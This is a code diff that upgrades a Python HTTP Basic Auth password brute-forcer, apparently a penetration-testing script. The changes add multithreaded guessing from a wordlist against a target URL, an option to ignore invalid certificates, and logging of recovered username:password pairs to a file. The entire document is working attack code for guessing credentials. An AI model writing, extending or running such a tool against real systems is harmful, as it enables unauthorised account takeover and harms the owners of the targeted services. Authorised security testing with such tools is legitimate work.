@@ -1,11 +1,13 @@
 #!/usr/bin/env python
 
 from time import sleep
-import httplib2
+import requests
 import sys
 import argparse
 import signal
 import os
+import threading
+import queue
 from urllib.parse import urlparse
 
 
@@ -25,7 +27,10 @@ parser.add_argument("--delay", type=int, help='Time in milliseconds between each
 parser.add_argument("--startat", type=int, help='Start at this line in the file', default=0)
 parser.add_argument("--ignore-consecutive-empty", type=int, help='Ignore this many consec. empty lines before exiting',
                     default=4)
-parser.add_argument("--ignore-invalid-certificate", type=bool, help='Ignore untrusted certs', default=True)
+parser.add_argument("--threads", type=int, help='Number of concurrent threads (default: 1)', default=1)
+parser.add_argument("--verbose", "-v", action="store_true", help='Enable verbose output')
+parser.add_argument("--output", "-o", type=str, help='Output results to file')
+parser.add_argument("--ignore-invalid-certificate", action="store_true", help='Ignore untrusted certs', default=False)
 
 args = parser.parse_args()
 
@@ -63,6 +68,11 @@ def validate_inputs():
     if args.startat < 0:
         print("Error: Start line must be non-negative")
         sys.exit(1)
+        
+    # Validate threads
+    if args.threads < 1 or args.threads > 50:
+        print("Error: Number of threads must be between 1 and 50")
+        sys.exit(1)
 
 validate_inputs()
 # END ARGS
@@ -77,17 +87,118 @@ count = 0
 maxEmptyCount = args.ignore_consecutive_empty
 currentLine = 0
 ignoreBadCerts = args.ignore_invalid_certificate
+numThreads = args.threads
+verbose = args.verbose
+outputFile = args.output
+found_password = False
+password_queue = queue.Queue()
+results_lock = threading.Lock()
 # END VARS
+
+def test_password(pwd, line_number):
+    """Test a single password"""
+    global found_password
+    
+    if found_password:
+        return
+    
+    try:
+        # Configure SSL verification
+        verify_ssl = not ignoreBadCerts
+        
+        # Make HTTP request with basic auth
+        response = requests.get(
+            target,
+            auth=(username, pwd),
+            verify=verify_ssl,
+            timeout=10,  # 10 second timeout
+            headers={'User-Agent': 'BrutePy/1.0'}
+        )
+        
+        with results_lock:
+            if found_password:
+                return
+                
+            if verbose:
+                print(f"Trying: {username}:[REDACTED] (line {line_number}) -> {response.status_code}")
+            elif line_number % 10 == 0:  # Progress every 10 attempts
+                print(f"Progress: tested {line_number} passwords...")
+            
+            if response.status_code == 200:
+                found_password = True
+                print(f"\n[SUCCESS] Authentication successful!")
+                print(f"Username: {username}")
+                print(f"Password found at line: {line_number}")
+                if outputFile:
+                    with open(outputFile, 'a') as f:
+                        f.write(f"SUCCESS: {target} - {username}:{pwd} (line {line_number})\n")
+                return True
+            elif response.status_code == 401:
+                if verbose:
+                    print("Authentication failed (401 Unauthorized)")
+            elif response.status_code == 403:
+                if verbose:
+                    print("Access forbidden (403) - credentials may be valid but access denied")
+            else:
+                if verbose:
+                    print(f"Unexpected response: {response.status_code}")
+                    
+    except requests.exceptions.ConnectionError as e:
+        print(f"Error: Connection failed - {e}")
+        return False
+    except requests.exceptions.Timeout:
+        if verbose:
+            print("Error: Request timed out")
+    except requests.exceptions.SSLError as e:
+        print(f"Error: SSL/TLS error - {e}")
+        if not ignoreBadCerts:
+            print("Try using --ignore-invalid-certificate flag for self-signed certificates")
+        return False
+    except Exception as e:
+        if verbose:
+            print(f"Error during request: {e}")
+    
+    return False
+
+def worker():
+    """Worker thread function"""
+    while not found_password:
+        try:
+            pwd, line_number = password_queue.get(timeout=1)
+            if pwd is None:  # Sentinel value to stop worker
+                break
+            test_password(pwd, line_number)
+            
+            # Apply delay between requests
+            if delay > 0:
+                sleep(delay / 1000.0)
+                
+            password_queue.task_done()
+        except queue.Empty:
+            continue
 
 print(f"Starting HTTP Basic Auth brute force against: {target}")
 print(f"Username: {username}")
 print(f"Wordlist: {wordlist}")
 print(f"Delay: {delay}ms between requests")
+print(f"Threads: {numThreads}")
+print(f"SSL verification: {'disabled' if ignoreBadCerts else 'enabled'}")
 if startAt > 0:
     print(f"Starting at line: {startAt}")
+if outputFile:
+    print(f"Output file: {outputFile}")
 print("-" * 50)
 
 try:
+    # Start worker threads
+    threads = []
+    for i in range(numThreads):
+        t = threading.Thread(target=worker)
+        t.daemon = True
+        t.start()
+        threads.append(t)
+    
+    # Read passwords and queue them
     with open(wordlist, "r") as f:
         pwd = f.readline().strip('\n')
         if startAt > 0:
@@ -97,40 +208,13 @@ try:
                 count += 1
                 currentLine += 1
         
-        while pwd:
+        while pwd and not found_password:
             currentLine += 1
             emptyCount = 0
             
-            # Only print password if it's not empty (avoid logging blank attempts)
+            # Only queue non-empty passwords
             if pwd.strip():
-                print(f"Trying: {username}:[REDACTED] (line {currentLine})")
-            
-            try:
-                http = httplib2.Http()
-                http.disable_ssl_certificate_validation = ignoreBadCerts
-                http.add_credentials(username, pwd)
-                res, content = http.request(target)
-                
-                print(f"Response: {res.status}")
-                
-                if res.status == 200:
-                    print(f"\n[SUCCESS] Authentication successful!")
-                    print(f"Username: {username}")
-                    print(f"Password found at line: {currentLine}")
-                    sys.exit(0)
-                elif res.status == 401:
-                    print("Authentication failed (401 Unauthorized)")
-                elif res.status == 403:
-                    print("Access forbidden (403) - credentials may be valid but access denied")
-                else:
-                    print(f"Unexpected response: {res.status}")
-                    
-            except httplib2.error.ServerNotFoundError as e:
-                print(f"Error: Server not found - {e}")
-                sys.exit(1)
-            except Exception as e:
-                print(f"Error during request: {e}")
-                print("Continuing with next password...")
+                password_queue.put((pwd, currentLine))
             
             pwd = f.readline().rstrip('\n')
             
@@ -139,24 +223,35 @@ try:
                 emptyCount += 1
                 if emptyCount > maxEmptyCount:
                     print(f"\nReached {maxEmptyCount} consecutive empty lines. Ending scan.")
-                    sys.exit(0)
+                    break
                 pwd = f.readline().rstrip('\n')
                 if not pwd and f.tell() == os.fstat(f.fileno()).st_size:
                     # Reached end of file
                     break
-            
-            # Apply delay between requests
-            if delay > 0:
-                sleep(delay / 1000.0)
     
-    print(f"\nScan completed. Tried {currentLine} passwords.")
-    print("No valid credentials found.")
+    # Wait for all queued passwords to be processed
+    password_queue.join()
+    
+    # Stop all worker threads
+    for i in range(numThreads):
+        password_queue.put((None, 0))  # Sentinel values
+    
+    for t in threads:
+        t.join(timeout=1)
+    
+    if found_password:
+        print("\nPassword found! Exiting.")
+        sys.exit(0)
+    else:
+        print(f"\nScan completed. Tried {currentLine} passwords.")
+        print("No valid credentials found.")
 
 except FileNotFoundError:
     print(f"Error: Wordlist file '{wordlist}' not found")
     sys.exit(1)
 except KeyboardInterrupt:
     print(f"\nScan interrupted by user at line {currentLine}")
+    found_password = True  # Stop all threads
     sys.exit(0)
 except Exception as e:
     print(f"Unexpected error: {e}")
